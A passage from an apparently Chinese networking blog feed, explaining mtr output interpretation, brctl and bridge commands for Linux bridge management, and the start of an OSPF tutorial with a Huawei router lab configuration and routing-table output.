</div><p><code>-m</code> 指定最大的跳数</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mtr -m <span class="m">35</span> 216.58.223.78
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>-s</code> 指定包的大小</p>
<h3 id="mtr输出的数据">mtr输出的数据</h3>
<table>
<thead>
<tr>
<th>colum</th>
<th>describe</th>
</tr>
</thead>
<tbody>
<tr>
<td>last</td>
<td>最近一次的探测延迟值</td>
</tr>
<tr>
<td>avg</td>
<td>探测延迟的平均值</td>
</tr>
<tr>
<td>best</td>
<td>探测延迟的最小值</td>
</tr>
<tr>
<td>wrst</td>
<td>探测延迟的最大值</td>
</tr>
<tr>
<td>stdev</td>
<td>标准偏差。越大说明相应节点越不稳定</td>
</tr>
</tbody>
</table>
<h3 id="丢包判断">丢包判断</h3>
<p>任一节点的 <code>Loss%</code>（丢包率）如果不为零，则说明这一跳网络可能存在问题。导致相应节点丢包的原因通常有两种。</p>
<ul>
<li>运营商基于安全或性能需求，人为限制了节点的ICMP发送速率，导致丢包。</li>
<li>节点确实存在异常，导致丢包。可以结合异常节点及其后续节点的丢包情况，来判定丢包原因。</li>
</ul>
<blockquote>
<p>Notes:</p>
<ul>
<li>如果随后节点均没有丢包，则通常说明异常节点丢包是由于运营商策略限制所致。可以忽略相关丢包。</li>
<li>如果随后节点也出现丢包，则通常说明节点确实存在网络异常，导致丢包。对于这种情况，如果异常节点及其后续节点连续出现丢包，而且各节点的丢包率不同，则通常以最后几跳的丢包率为准。如链路测试在第5, 6, 7跳均出现了丢包。最终丢包情况以第7跳作为参考。</li>
</ul>
</blockquote>
<h3 id="延迟判断">延迟判断</h3>
<p>由于链路抖动或其它因素的影响，节点的 <em>Best</em> 和 <em>Worst</em> 值可能相差很大。而 <em>Avg</em>（平均值）统计了自链路测试以来所有探测的平均值，所以能更好的反应出相应节点的网络质量。而 <em>StDev</em>（标准偏差值）越高，则说明数据包在相应节点的延时值越不相同（越离散）。所以标准偏差值可用于协助判断 <em>Avg</em> 是否真实反应了相应节点的网络质量。例如，如果标准偏差很大，说明数据包的延迟是不确定的。可能某些数据包延迟很小（例如：25ms），而另一些延迟却很大（例如：350ms），但最终得到的平均延迟反而可能是正常的。所以此时 <em>Avg</em> 并不能很好的反应出实际的网络质量情况。</p>
<p>这就需要结合如下情况进行判断：</p>
<ul>
<li>如果 <em>StDev</em> 很高，则同步观察相应节点的 <em>Best</em> 和 <em>wrst</em>，来判断相应节点是否存在异常。</li>
<li>如果<em>StDev</em> 不高，则通过Avg来判断相应节点是否存在异常。</li>
</ul>
<h2 id="brctl-supa-href55asup">brctl <sup><a href="#5">[5]</a></sup></h2>
<p><em><strong>brctl</strong></em> 是用于创建和操作 Linux Bridge 的命令行工具，</p>
<blockquote>
<p><strong>各系统下的安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>bridge-utils</code>  ；<code>apt-get install -y bridge-utils</code></li>
<li>CentOS/Fedora: <code> bridge-utils</code> ；<code>yum install -y bridge-utils</code></li>
<li>Apline：<code>bridge-utils</code> ；<code>apk add bridge-utils --no-cache</code></li>
</ul>
</blockquote>
<h3 id="显示所有启用的网桥的设备">显示所有启用的网桥的设备</h3>
<p>使用 <code>brctl show</code> 查看当前节点可用的 bridge</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl show
</span></span><span class="line"><span class="cl">bridge name bridge id STP enabled interfaces
</span></span><span class="line"><span class="cl">br0 8000.000d3a8a7868 no eth1
</span></span><span class="line"><span class="cl">vnet0
</span></span><span class="line"><span class="cl">virbr0 8000.5254005098ae yes virbr0-nic
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="创建网桥">创建网桥</h3>
<p>使用 <code>brctl addbr &lt;name&gt;</code> 可以创建出一个Linux Bridge</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">brctl addbr dev
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="在网桥上添加接口">在网桥上添加接口</h3>
<p>使用 <code>brctl addif &lt;bridge_name&gt; &lt;interface_name&gt;</code> 可以在一个已经存在的 bridge 上添加一个接口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl addif br0 eth1
</span></span></code></pre></td></tr></table>
</div>
</div><p>指定多个 <code>&lt;interface_name&gt;</code>  会向网桥上添加多个接口</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl addif br0 enp0s3 enp1s3
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="删除网桥">删除网桥</h3>
<p>使用 <code>brctl delbr &lt;bridge_name&gt;</code> 可以删除一个网桥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl delbr br0
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="检查网桥-stf-信息">检查网桥 STF 信息</h3>
<p>使用 <code>brctl showstp &lt;bridge_name&gt;</code> 可以查看网桥的STF信息</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl showstp br0
</span></span><span class="line"><span class="cl">br0
</span></span><span class="line"><span class="cl">bridge id 8000.000000000000
</span></span><span class="line"><span class="cl">designated root 8000.000000000000
</span></span><span class="line"><span class="cl">root port <span class="m">0</span> path cost <span class="m">0</span>
</span></span><span class="line"><span class="cl">max age 20.00 bridge max age 20.00
</span></span><span class="line"><span class="cl">hello <span class="nb">time</span> 2.00 bridge hello <span class="nb">time</span> 2.00
</span></span><span class="line"><span class="cl">forward delay 15.00 bridge forward delay 15.00
</span></span><span class="line"><span class="cl">ageing <span class="nb">time</span> 300.00
</span></span><span class="line"><span class="cl">hello timer 0.00 tcn timer 0.00
</span></span><span class="line"><span class="cl">topology change timer 0.00 gc timer 0.00
</span></span><span class="line"><span class="cl">flags
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="从网桥上删除接口">从网桥上删除接口</h3>
<p>使用 <code>brctl delif &lt;bridge_name&gt; &lt;interface_name&gt;</code> 可以从网桥上删除接口。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl delif br0 enp0s3
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="开启关闭生成树协议">开启/关闭生成树协议</h3>
<p>使用 <code>brctl stp &lt;bridge_name&gt; on/off</code> 可以选择开启或关闭生成树协议</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl stp br0 off
</span></span><span class="line"><span class="cl">$ brctl stp br0 on
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="查看网桥上学到的mac地址">查看网桥上学到的MAC地址</h3>
<p>使用 <code>brctl showmacs &lt;bridge_name&gt;</code> 可以查看网桥上学到的所有设备的MAC地址。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl showmacs br0
</span></span><span class="line"><span class="cl">port no mac addr                is local?       ageing timer
</span></span><span class="line"><span class="cl"><span class="m">1</span>       00:74:16:87:14:de       yes                0.00
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="修改stp值">修改STP值</h3>
<p>如果需要修改 STP 参数值，可以通过 <code>brctl setageing &lt;bridge_name&gt; &lt;value&gt;</code> 来修改</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ brctl setageing br0 <span class="m">100</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bridge-supa-href66asup">bridge <sup><a href="#6">[6]</a></sup></h2>
<p><em><strong>bridge</strong></em> 是一款用于展示和操作网桥地址和设备的命令，通常情况下</p>
<blockquote>
<p><strong>各系统下的包名与安装</strong></p>
<ul>
<li>Ubuntu/Debian: <code>iproute2</code>  ；<code>apt install iproute2</code></li>
<li>CentOS/Fedora: <code>iproute2</code> ；<code>yum install -y iproute2</code></li>
<li>Apline：<code>iproute2 </code> ；<code>apk add iproute2</code></li>
</ul>
</blockquote>
<p>bridge 命令可以完成三种类型的配置管理：</p>
<ul>
<li>端口配置</li>
<li>FDB管理</li>
<li>VLAN 配置</li>
</ul>
<p>大多数人都会使用 <em><strong>brctl</strong></em> 命令替代，而 <em><strong>bridge</strong></em> 通常只是来完成 <em><strong>FDB</strong></em> (forwarding database management ) 的相关操作。。也可以使用 <em><strong>bridge</strong></em> 命令创建和删除VLAN。</p>
<h3 id="bridge-vs-brct-supa-href77asup">bridge vs brct <sup><a href="#7">[7]</a></sup></h3>
<center>BRIDGE MANAGEMENT</center>
<table>
<thead>
<tr>
<th>动作</th>
<th>BRCTL</th>
<th>BRIDGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>创建bridge</td>
<td><code>brctl addbr &lt;bridge&gt;</code></td>
<td></td>
</tr>
<tr>
<td>删除bridge</td>
<td><code>brctl delbr &lt;bridge&gt;</code></td>
<td></td>
</tr>
<tr>
<td>为bridge添加接口</td>
<td><code>brctl addif &lt;bridge&gt; &lt;ifname&gt;</code></td>
<td></td>
</tr>
<tr>
<td>删除bridge上的接口</td>
<td><code>brctl delbr &lt;bridge&gt;</code></td>
<td></td>
</tr>
</tbody>
</table>
<center>FDB MANAGEMENT</center>
<table>
<thead>
<tr>
<th>ACTION</th>
<th>BRCTL</th>
<th>BRIDGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>显示 FDB 中的 MAC 列表</td>
<td><code>brctl showmacs &lt;bridge&gt;</code></td>
<td><code>bridge fdb show</code></td>
</tr>
<tr>
<td>设置 FDB 条目老化时间</td>
<td><code>brctl setageingtime  &lt;bridge&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置 FDB 垃圾回收间隔</td>
<td><code>brctl setgcint &lt;brname&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>添加FDB 条目(add)</td>
<td></td>
<td><code>bridge fdb add dev &lt;interface&gt; [dst, vni, port, via]</code></td>
</tr>
<tr>
<td>追加FDB条目(append)</td>
<td></td>
<td><code>bridge fdb append  (parameters same as for fdb add)</code></td>
</tr>
<tr>
<td>删除 FDB 条目</td>
<td></td>
<td><code>bridge fdb delete (parameters same as for fdb add)</code></td>
</tr>
</tbody>
</table>
<center>STP MANAGEMENT</center>
<table>
<thead>
<tr>
<th>ACTION</th>
<th>BRCTL</th>
<th>BRIDGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>打开/关闭 STP</td>
<td><code>brctl stp &lt;bridge&gt; &lt;state&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置网桥优先级</td>
<td><code>brctl setbridgeprio &lt;bridge&gt; &lt;priority&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置网桥转发延迟</td>
<td><code>brctl setfd &lt;bridge&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置bridge  “hello”时间</td>
<td><code>brctl sethello &lt;bridge&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置网桥最大消息年龄</td>
<td><code>brctl setmaxage &lt;bridge&gt; &lt;time&gt;</code></td>
<td></td>
</tr>
<tr>
<td>设置桥上端口开销</td>
<td><code>brctl setpathcost &lt;bridge&gt; &lt;port&gt; &lt;cost&gt;</code></td>
<td><code>bridge link set dev &lt;port&gt; cost &lt;cost&gt;</code></td>
</tr>
<tr>
<td>设置网桥端口优先级</td>
<td><code>brctl setportprio &lt;bridge&gt; &lt;port&gt; &lt;priority&gt;</code></td>
<td><code>bridge link set dev &lt;port&gt; priority &lt;priority&gt;</code></td>
</tr>
<tr>
<td>是否应端口处理 STP BDPU</td>
<td></td>
<td><code>bridge link set dev &lt;port &gt; guard [on, off]</code></td>
</tr>
<tr>
<td>网桥是否应该在接收到的端口上发送流量</td>
<td></td>
<td><code>bridge link set dev &lt;port&gt; hairpin [on,off]</code></td>
</tr>
<tr>
<td>在端口上启用/禁用 fastleave 选项</td>
<td></td>
<td><code>bridge link set dev &lt;port&gt; fastleave [on,off]</code></td>
</tr>
<tr>
<td>设置 STP 端口状态</td>
<td></td>
<td><code>bridge link set dev &lt;port&gt; state &lt;state&gt;</code></td>
</tr>
</tbody>
</table>
<center>VLAN MANAGEMENT</center>
<table>
<thead>
<tr>
<th>ACTION</th>
<th>BRCTL</th>
<th>BRIDGE</th>
</tr>
</thead>
<tbody>
<tr>
<td>创建新的 VLAN 过滤器条目</td>
<td></td>
<td>bridge vlan add dev <dev> [vid, pvid, untagged, self, master]</td>
</tr>
<tr>
<td>删除 VLAN 过滤器条目</td>
<td></td>
<td>bridge vlan delete dev <dev> (parameters same as for vlan add)</td>
</tr>
<tr>
<td>列出 VLAN 配置</td>
<td></td>
<td>bridge vlan show</td>
</tr>
</tbody>
</table>
<h2 id="reference">Reference</h2>
<blockquote>
<p><sup id="1">[1]</sup> <a href="https://danielmiessler.com/study/tcpdump/">tcpdump</a></p>
<p><sup id="2">[2]</sup> <a href="https://www.redhat.com/sysadmin/linux-mtr-command">linux mtr command</a></p>
<p><sup id="3">[3]</sup> <a href="https://man7.org/linux/man-pages/man1/nsenter.1.html">man nsenter</a></p>
<p><sup id="4">[4]</sup> <a href="https://laramatic.com/how-to-install-nsenter-in-debian-ubuntu-alpine-arch-kali-CentOS-fedora-raspbian-and-macos/">How to install nsenter</a></p>
<p><sup id="5">[5]</sup> <a href="https://www.cyberithub.com/10-best-linux-brctl-command-examples-for-ethernet-network-bridge/">examples for ethernet network bridge</a></p>
<p><sup id="6">[6]</sup> <a href="https://man7.org/linux/man-pages/man8/bridge.8.html">man bridge</a></p>
<p><sup id="7">[7]</sup> <a href="https://sgros-students.blogspot.com/2013/11/comparison-of-brctl-and-bridge-commands.html">comparison of brctl and bridge</a></p>
</blockquote>
]]></content:encoded>
    </item>
    
    <item>
      <title>动态路由 - OSPF</title>
      <link>https://www.oomkill.com/2021/01/dynamic-routing-ospf/</link>
      <pubDate>Sat, 02 Jan 2021 00:00:00 +0000</pubDate>
      
      <guid>https://www.oomkill.com/2021/01/dynamic-routing-ospf/</guid>
      <description></description>
      <content:encoded><![CDATA[<p>Open Shortest Path First <code>OSPF</code>，开放的最短路径优先协议，是IETF组织开发的一个基于链路状态的内部网关协议，它的使用不受任何厂商限制，所有人都可以使用，所以称为开放的，而最短路径优先（SPF）只是OSPF的核心思想，其使用的算法是Dijkstra算法，最短路径优先并没有太多特殊的含义，并没有任何一个路由协议是最长路径优先的，所有协议，都会选最短的。</p>
<p>OSPF针对IPv4协议使用的是OSPF Version 2（RFC2328）；针对IPv6协议使用OSPF Version 3（RFC2740）</p>
<p>目的：</p>
<p>在OSPF出现前，网络上广泛使用RIP（Routing Information Protocol）作为内部网关协议。</p>
<p>由于RIP是基于距离矢量算法的路由协议，存在着收敛慢、路由环路、可扩展性差等问题，所以逐渐被OSPF取代。</p>
<p>OSPF作为基于链路状态的协议，能够解决RIP所面临的诸多问题。此外，OSPF还有以下优点：</p>
<ul>
<li>OSPF采用组播形式收发报文，这样可以减少对其它不运行OSPF路由器的影响。</li>
<li>OSPF支持无类型域间选路（CIDR）。</li>
<li>OSPF支持对等价路由进行负载分担。</li>
<li>OSPF支持报文加密。</li>
</ul>
<p>由于OSPF具有以上优势，使得OSPF作为优秀的内部网关协议被快速接收并广泛使用。</p>
<p>OSPF协议特点：</p>
<ul>
<li>OSPF把自治系统AS（Autonomous System）划分成逻辑意义上的一个或多个区域；</li>
<li>OSPF通过LSA（Link State Advertisement）的形式发布路由；</li>
<li>OSPF依靠在OSPF区域内各设备间交互OSPF报文来达到路由信息的统一；</li>
<li>OSPF报文封装在IP报文内，可以采用单播或组播的形式发送。</li>
</ul>
<h2 id="ospf工作流程">OSPF工作流程</h2>
<p><strong>寻找邻居</strong></p>
<p>OSPF协议运行后，先寻找网络中可与自己交互链路状态信息的周边路由器，可以交互链路状态信息的路由器互为邻居</p>
<p><strong>建立邻居关系</strong></p>
<p>邻接关系可以想象为一条点到点的虚链路，他是在一些邻居路由器之间构成的。只有建立了可靠邻接关系的路由器才相互传递链路状态信息。</p>
<p><strong>链路状态信息传递</strong></p>
<p>OSPF路由器将建立描述网络链路状态的LSA Link State Advertisement，链路状态公告，建立邻接关系的OSPF路由器之间将交互LSA，最终形成包含网络完整链路状态的配置信息。</p>
<p><strong>计算路由</strong></p>
<p>获得了完整的LSBD后，OSPF区域内的每个路由器将会对该区域的网络结构有相同的认识，随后各路由器将依据LSDB的信息用SPF算法独立计算出路由。</p>
<h2 id="router-id">Router ID</h2>
<p>OSPF Router-ID用于在OSPF domain中唯一地表示一台OSPF路由器，从OSPF网络设计的角度，我们要求全OSPF域内，<strong>禁止出现两台路由器拥有相同的Router-ID</strong>。</p>
<p>OSPF Router-ID的设定可以通过手工配置的方式，或者通过协议自动选取的方式。当然，在实际网络部署中，强烈建议手工配置OSPF的Router-ID，因为这关系到协议的稳定。</p>
<h2 id="实验单区域ospf配置">实验：单区域OSPF配置</h2>
<p>
  <img loading="lazy" src="https://cdn.jsdelivr.net/gh/CylonChau/imgbed/img/image-20210125194222939.png" alt="image-20210125194222939"  /></p>
<p>配置两台路由器</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">[</span>Huawei<span class="o">]</span>sysname R2
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>R2<span class="o">]</span>interface lo0
</span></span><span class="line"><span class="cl"><span class="o">[</span>R2-LoopBack0<span class="o">]</span>ip add 2.2.2.2 <span class="m">32</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>R2-LoopBack0<span class="o">]</span>dis this
</span></span><span class="line"><span class="cl"><span class="o">[</span>V200R003C00<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl">interface LoopBack0
</span></span><span class="line"><span class="cl"> ip address 2.2.2.2 255.255.255.255 
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>R2-LoopBack0<span class="o">]</span>quit
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>R2<span class="o">]</span>interface g0/0/0
</span></span><span class="line"><span class="cl"><span class="o">[</span>R2-GigabitEthernet0/0/0<span class="o">]</span>ip a 20.0.0.1 <span class="m">24</span>
</span></span><span class="line"><span class="cl">Jan <span class="m">24</span> <span class="m">2021</span> 22:01:22-08:00 R2 %%01IFNET/4/LINK_STATE<span class="o">(</span>l<span class="o">)[</span>0<span class="o">]</span>:The line protocol IP 
</span></span><span class="line"><span class="cl">on the interface GigabitEthernet0/0/0 has entered the UP state. 
</span></span><span class="line"><span class="cl"><span class="o">[</span>R2-GigabitEthernet0/0/0<span class="o">]</span>dis this
</span></span><span class="line"><span class="cl"><span class="o">[</span>V200R003C00<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl">interface GigabitEthernet0/0/0
</span></span><span class="line"><span class="cl"> ip address 20.0.0.1 255.255.255.0 
</span></span><span class="line"><span class="cl"><span class="c1">#</span>
</span></span><span class="line"><span class="cl"><span class="k">return</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="o">[</span>R2<span class="o">]</span>dis ip routing-table 
</span></span><span class="line"><span class="cl">Route Flags: R - relay, D - download to fib
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">Routing Tables: Public
</span></span><span class="line"><span class="cl">         Destinations : <span class="m">8</span>        Routes : <span class="m">8</span>        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        2.2.2.2/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       LoopBack0
</span></span><span class="line"><span class="cl">       20.0.0.0/24  Direct  <span class="m">0</span>    <span class="m">0</span>           D   20.0.0.1        GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">       20.0.0.1/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">     20.0.0.255/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">      127.0.0.0/8   Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       InLoopBack0
</span></span><span class="line"><span class="cl">      127.0.0.1/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       InLoopBack0
</span></span><span class="line"><span class="cl">127.255.255.255/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       InLoopBack0
</span></span><span class="line"><span class="cl">255.255.255.255/32  Direct  <span class="m">0</span>    <span class="m">0</span>           D   127.0.0.1       InLoopBack0
</span></span></code></pre></td></tr></table>
</div>
</div><p>整理配置</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sysname R2
</span></span><span class="line"><span class="cl">interface lo0
</span></span><span class="line"><span class="cl">ip add 2.2.2.2 32
</span></span><span class="line"><span class="cl">[R2-LoopBack0]dis this
</span></span><span class="line"><span class="cl">quit
</span></span><span class="line"><span class="cl">interface g0/0/0
</span></span><span class="line"><span class="cl">ip a 20.0.0.1 24
</span></span><span class="line"><span class="cl">dis this
</span></span><span class="line"><span class="cl">dis ip routing-table 
</span></span></code></pre></td></tr></table>
</div>
</div><p>配置ospf协议</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># 配置route-id</span>
</span></span><span class="line"><span class="cl">ospf router-id 2.2.2.2
</span></span><span class="line"><span class="cl"><span class="c1"># 选择区域</span>
</span></span><span class="line"><span class="cl"><span class="c1"># OSPF实施了两层的分层：</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 1.骨干区域（也就是area0）</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 2.连接到骨干的区域（area1~65535）</span>
</span></span><span class="line"><span class="cl">area <span class="m">0</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 声明一个路由，子网掩码为反向的</span>
</span></span><span class="line"><span class="cl">network 2.2.2.2 0.0.0.0
</span></span><span class="line"><span class="cl">network 10.0.0.0 0.0.0.255
</span></span><span class="line"><span class="cl"><span class="c1"># 打印ospf对的简要信息</span>
</span></span><span class="line"><span class="cl">dis ospf peer brief 
</span></span><span class="line"><span class="cl"><span class="c1"># 显示ospf路由表</span>
</span></span><span class="line"><span class="cl">dis ospf routing
</span></span></code></pre></td></tr></table>
</div>
</div><p>可以看到对应的已经学习到动态的路由</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[R1]dis ip routing-table 
</span></span><span class="line"><span class="cl">Route Flags: R - relay, D - download to fib
</span></span><span class="line"><span class="cl">------------------------------------------------------------------------------
</span></span><span class="line"><span class="cl">Routing Tables: Public
</span></span><span class="line"><span class="cl">         Destinations : 9        Routes : 9        
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Destination/Mask    Proto   Pre  Cost      Flags NextHop         Interface
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        1.1.1.1/32  Direct  0    0           D   127.0.0.1       LoopBack0
</span></span><span class="line"><span class="cl">        2.2.2.2/32  OSPF    10   1           D   10.0.0.2        GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">       10.0.0.0/24  Direct  0    0           D   10.0.0.1        GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">       10.0.0.1/32  Direct  0    0           D   127.0.0.1       GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">     10.0.0.255/32  Direct  0    0           D   127.0.0.1       GigabitEthernet
</span></span><span class="line"><span class="cl">0/0/0
</span></span><span class="line"><span class="cl">      127.0.0.0/8   Direct  0    0           D   127.0.0.1       InLoopBack0
</span></span><span class="line"><span class="cl">      127.0.0.1/32  Direct  0    0           D   127.0.0.1       InLoopBack0
